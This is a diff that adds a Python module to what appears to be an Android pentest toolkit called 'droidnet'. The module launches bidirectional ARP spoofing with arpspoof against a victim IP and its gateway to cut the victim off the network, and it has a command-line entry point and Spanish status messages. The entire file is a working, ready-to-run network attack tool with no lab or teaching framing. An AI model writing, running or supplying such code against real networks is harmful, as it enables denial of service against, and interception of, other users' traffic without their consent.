@@ -1,0 +1,94 @@
+"""
+ARP Poison Module — bidirectional ARP spoofing via arpspoof/dsniff.
+
+Why arpspoof and not Scapy?
+    Scapy requires raw socket access at the kernel level. Android
+    blocks this even with root. arpspoof (part of dsniff) uses a
+    native implementation compatible with the Android kernel.
+
+Attack flow:
+    proc1: arpspoof -i <iface> -t <VICTIM>  <GATEWAY>
+        → tells the VICTIM that the GATEWAY is at our MAC
+    proc2: arpspoof -i <iface> -t <GATEWAY> <VICTIM>
+        → tells the GATEWAY that the VICTIM is at our MAC
+    Result: traffic goes nowhere → target loses internet.
+
+On Ctrl+C both processes are terminated; arpspoof sends legitimate
+ARP replies during shutdown, restoring the table on both sides.
+
+Install: pkg install dsniff
+"""
+
+import shutil
+import subprocess
+import sys
+
+from rich import print as rprint
+
+from droidnet.platform.utils import check_root, get_default_iface
+
+
+def _arpspoof_available() -> bool:
+    """Return True if arpspoof is found in PATH."""
+    return shutil.which("arpspoof") is not None
+
+
+def poison(target_ip: str, gateway_ip: str, iface: str = "wlan0") -> None:
+    """
+    Run a bidirectional ARP poisoning attack against *target_ip*.
+
+    Blocks until Ctrl+C, then restores the ARP table on both ends.
+
+    Args:
+        target_ip  : IP of the device to cut off.
+        gateway_ip : IP of the network gateway/router.
+        iface      : Network interface to use (default: wlan0).
+    """
+    if not _arpspoof_available():
+        rprint("[bold red][✗] arpspoof no encontrado.[/bold red]")
+        rprint("[dim]Instala con: pkg install dsniff[/dim]")
+        return
+
+    rprint(f"[bold red][☠][/bold red] Envenenando ARP...")
+    rprint(f"  Víctima : [cyan]{target_ip}[/cyan]")
+    rprint(f"  Gateway : [cyan]{gateway_ip}[/cyan]")
+    rprint(f"  Iface   : [cyan]{iface}[/cyan]")
+    rprint(f"  [dim]Ctrl+C para detener y restaurar.[/dim]\n")
+
+    proc1 = subprocess.Popen(
+        ["arpspoof", "-i", iface, "-t", target_ip, gateway_ip],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+    proc2 = subprocess.Popen(
+        ["arpspoof", "-i", iface, "-t", gateway_ip, target_ip],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+
+    rprint(f"[bold green][✓][/bold green] Ataque activo (PIDs: {proc1.pid}, {proc2.pid})")
+
+    try:
+        proc1.wait()
+    except KeyboardInterrupt:
+        rprint(f"\n[bold yellow][!][/bold yellow] Deteniendo y restaurando red...")
+        proc1.terminate()
+        proc2.terminate()
+        proc1.wait()
+        proc2.wait()
+        rprint("[bold green][✓][/bold green] Limpio. La víctima recobró internet.")
+
+
+if __name__ == "__main__":
+    if not check_root():
+        rprint("[red][✗] Necesitas root.[/red]")
+        sys.exit(1)
+
+    if len(sys.argv) < 3:
+        rprint("[yellow]Uso: python -m droidnet.modules.spoofer <IP_VICTIMA> <IP_GATEWAY> [IFACE][/yellow]")
+        sys.exit(1)
+
+    _target  = sys.argv[1]
+    _gateway = sys.argv[2]
+    _iface   = sys.argv[3] if len(sys.argv) > 3 else get_default_iface()
+    poison(_target, _gateway, _iface)
